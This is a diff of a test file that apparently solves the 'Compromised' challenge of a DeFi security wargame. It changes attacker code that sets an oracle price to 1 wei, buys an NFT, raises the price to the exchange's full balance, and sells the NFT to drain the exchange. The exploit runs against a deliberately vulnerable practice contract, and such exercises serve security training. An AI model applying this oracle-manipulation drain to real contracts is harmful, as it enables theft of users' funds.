@@ -19,13 +19,13 @@ describe('Compromised challenge', function () {
         '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
     ];
 
-    let deployer, attacker, source1;
+    let deployer, attacker, someacc;
     const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
     const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
+        [deployer, attacker, someacc] = await ethers.getSigners();
 
         const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
         const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
@@ -138,7 +138,7 @@ describe('Compromised challenge', function () {
           };
       
           // 1. reduce NFT price to buy it cheap
-          const reducedPrice = ethers.utils.parseEther(`0.01`)
+          const reducedPrice = ethers.utils.parseEther(ethers.utils.formatEther(ethers.BigNumber.from('1')));
           await changePrice(reducedPrice.toString());
       
           // 2. buy 1 NFT at this price
@@ -149,10 +149,18 @@ describe('Compromised challenge', function () {
         //   balance.current(this.exchange.address);
           await changePrice(exchangeBalance.toString());
       
+          const FIRST_TOKEN_ID = 0;
+
           // 4. approve transferFrom of 1 DVNFT token and sell it
-          await this.nftToken.connect(attacker).approve(this.exchange.address, 1);
-        //   const FIRST_TOKEN_ID = 1;
-          await this.exchange.connect(attacker).sellOne(0);
+          await this.nftToken.connect(attacker).approve(this.exchange.address, FIRST_TOKEN_ID);
+          console.log(exchangeBalance);
+
+          await this.exchange.connect(attacker).sellOne(FIRST_TOKEN_ID);
+
+          await attacker.sendTransaction({
+            to: someacc.address,
+            value: ethers.utils.parseEther(ethers.utils.formatEther(ethers.BigNumber.from('1'))),
+          });
       
     });
 
